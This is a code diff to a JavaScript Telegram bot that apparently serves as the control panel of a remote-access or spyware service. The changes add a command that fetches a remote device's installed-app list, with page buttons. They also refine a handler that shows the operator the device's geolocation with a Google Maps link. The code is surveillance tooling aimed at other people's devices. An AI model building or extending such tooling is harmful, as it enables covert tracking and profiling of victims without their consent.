@@ -38,7 +38,7 @@ function isUrl(mayurl){
     return urlRegex.test(mayurl);
 }
 
-function sortAppsToString(apps, inslice){
+function sortAppsToString(apps, inslice, devid, msgowner){
     let allapps = chunkArray(apps, 5);
     let realslice = allapps[inslice] || [];
 
@@ -65,11 +65,34 @@ function sortAppsToString(apps, inslice){
         }
     }
 
+    let keybinds = [[]];
+
+    if (inslice < (allapps.length - 1)){
+        keybinds[0].push({
+            text: build("next ⏭"),
+            callback_data: `seeApps_${msgowner}_${devid}_${inslice + 1}`
+        })
+    }
+
+    if (inslice > 0){
+        keybinds[0].push({
+            text: build("⏮ previous"),
+            callback_data: `seeApps_${msgowner}_${devid}_${inslice - 1}`
+        })
+    }
+
+    if (keybinds[0].length == 0){
+        keybinds.pop();
+    }
+
+    keybinds.push([{
+        text: build("close"),
+        callback_data: `close_${msgowner}`
+    }])
+
     return {
-        status: true,
         message: s,
-        next_slice: inslice < (allapps.length - 1),
-        previous_slice: inslice > 0
+        binds: keybinds
     }
 
 }
@@ -939,49 +962,136 @@ bot.on("callback_query", async (call) => {
             me.on("data", async (data) => {
                 let _message = JSON.parse(data.toString());
                 if (_message.method == "getGeoLocation"){
-                    if (!_message.status && _message.message == "YOU_BANNED"){
-                        await bot.editMessageText(
-                            build("🔴 𓏺|𓏺 sorry but you got banned"),
-                            {
-                                message_id: call.message.message_id,
-                                chat_id: call.message.chat.id
-                            }
-                        )
-                    } else if (!_message.status && _message.message == "INVALID_PORT_OR_PASSWORD"){
-                        await bot.editMessageText(
-                            build("🔴 𓏺|𓏺 invalid port or password detected"),
-                            {
-                                message_id: call.message.message_id,
-                                chat_id: call.message.chat.id
-                            }
-                        )
-                    } else if (!_message.status && _message.message == "USER_NOT_FOUND"){
-                        await bot.editMessageText(
-                            build("🔴 𓏺|𓏺 user not found, its because the use disconnected suddenly"),
-                            {
-                                message_id: call.message.message_id,
-                                chat_id: call.message.chat.id
-                            }
-                        )
-                    } else if (!_message.status && _message.message == null){
-                        await bot.editMessageText(
-                            build(`🔴 ${sym} process didnt successful`),{
-                                message_id: call.message.message_id,
-                                chat_id: call.message.chat.id
-                            }
-                        )
-                    } else if (_message.status && _message.device_id == devid){
-                        await bot.editMessageText(
-                            build(`🗺 ${sym} device geo-location were found\n🔦 ${sym} longitude & latitude: \n`) + `<code>${_message.latitude},${_message.longitude}</code>\n` + build(`🌐 ${sym} see on `) + `<a href="https://www.google.com/maps/@${_message.latitude},${_message.longitude},15z">${build("google-map")}</a>`,
-                            {
-                                message_id: call.message.message_id,
-                                chat_id: call.message.chat.id,
-                                parse_mode: "HTML"
-                            }
-                        )
+                    if (_message.device_id == devid){
+                        if (!_message.status && _message.message == "YOU_BANNED"){
+                            await bot.editMessageText(
+                                build("🔴 𓏺|𓏺 sorry but you got banned"),
+                                {
+                                    message_id: call.message.message_id,
+                                    chat_id: call.message.chat.id
+                                }
+                            )
+                        } else if (!_message.status && _message.message == "INVALID_PORT_OR_PASSWORD"){
+                            await bot.editMessageText(
+                                build("🔴 𓏺|𓏺 invalid port or password detected"),
+                                {
+                                    message_id: call.message.message_id,
+                                    chat_id: call.message.chat.id
+                                }
+                            )
+                        } else if (!_message.status && _message.message == "USER_NOT_FOUND"){
+                            await bot.editMessageText(
+                                build("🔴 𓏺|𓏺 user not found, its because the use disconnected suddenly"),
+                                {
+                                    message_id: call.message.message_id,
+                                    chat_id: call.message.chat.id
+                                }
+                            )
+                        } else if (!_message.status && _message.message == null){
+                            await bot.editMessageText(
+                                build(`🔴 ${sym} process didnt successful`),{
+                                    message_id: call.message.message_id,
+                                    chat_id: call.message.chat.id
+                                }
+                            )
+                        } else if (_message.status){
+                            await bot.editMessageText(
+                                build(`🗺 ${sym} device geo-location were found\n🔦 ${sym} longitude & latitude: \n`) + `<code>${_message.latitude},${_message.longitude}</code>\n` + build(`🌐 ${sym} see on `) + `<a href="https://www.google.com/maps/@${_message.latitude},${_message.longitude},15z">${build("google-map")}</a>`,
+                                {
+                                    message_id: call.message.message_id,
+                                    chat_id: call.message.chat.id,
+                                    parse_mode: "HTML"
+                                }
+                            )
+                        }
                     }
                 }
             })
+        } else if (mode == "getInstalledApps"){
+            let devid = spl[2];
+            me.write(JSON.stringify({
+                port: portname,
+                password: passname,
+                method: "getInstalledApps",
+                device_id: devid
+            }));
+            me.on("data", async (data) => {
+                let _message = JSON.parse(data.toString());
+                if (_message.method == "getInstalledApps"){
+                    if (_message.device_id == devid){
+                        if (!_message.status && _message.message == "YOU_BANNED"){
+                            await bot.editMessageText(
+                                build("🔴 𓏺|𓏺 sorry but you got banned"),
+                                {
+                                    message_id: call.message.message_id,
+                                    chat_id: call.message.chat.id
+                                }
+                            )
+                        } else if (!_message.status && _message.message == "INVALID_PORT_OR_PASSWORD"){
+                            await bot.editMessageText(
+                                build("🔴 𓏺|𓏺 invalid port or password detected"),
+                                {
+                                    message_id: call.message.message_id,
+                                    chat_id: call.message.chat.id
+                                }
+                            )
+                        } else if (!_message.status && _message.message == "USER_NOT_FOUND"){
+                            await bot.editMessageText(
+                                build("🔴 𓏺|𓏺 user not found, its because the use disconnected suddenly"),
+                                {
+                                    message_id: call.message.message_id,
+                                    chat_id: call.message.chat.id
+                                }
+                            )
+                        } else if (!_message.status && _message.message == null){
+                            await bot.editMessageText(
+                                build(`🔴 ${sym} process didnt successful`),{
+                                    message_id: call.message.message_id,
+                                    chat_id: call.message.chat.id
+                                }
+                            )
+                        } else if (_message.status){
+                            device_apps[devid] = _message.apps;
+                            let sats = sortAppsToString(_message.apps, 0, devid, uid);
+                            await bot.editMessageText(
+                                sats.message,
+                                {
+                                    message_id: call.message.message_id,
+                                    chat_id: call.message.chat.id,
+                                    reply_markup: {
+                                        inline_keyboard: sats.binds
+                                    }
+                                }
+                            )
+                        }
+                    }
+                }
+            })
+        } else if (mode == "seeApps"){
+            let devid = spl[2];
+            let slc = spl[3];
+            let allapps = chunkArray(device_apps[devid], 5);
+            if (allapps[slc] == undefined || allapps[slc] == null || allapps[slc] == []){
+                await bot.editMessageText(
+                    build(`🔴 ${sym} list of apps were changed, please see applications again to set new array in remote-local-variables, then use keys to see other apps`),
+                    {
+                        message_id: call.message.message_id,
+                        chat_id: call.message.chat.id
+                    }
+                )
+            } else {
+                let sats = sortAppsToString(device_apps[devid], slc, devid, uid);
+                await bot.editMessageText(
+                    sats.message,
+                    {
+                        message_id: call.message.message_id,
+                        chat_id: call.message.chat.id,
+                        reply_markup: {
+                            inline_keyboard: sats.binds
+                        }
+                    }
+                )
+            }
         }
     } else {
         if (["seeadmins", "backadminpanel"].includes(mode)){
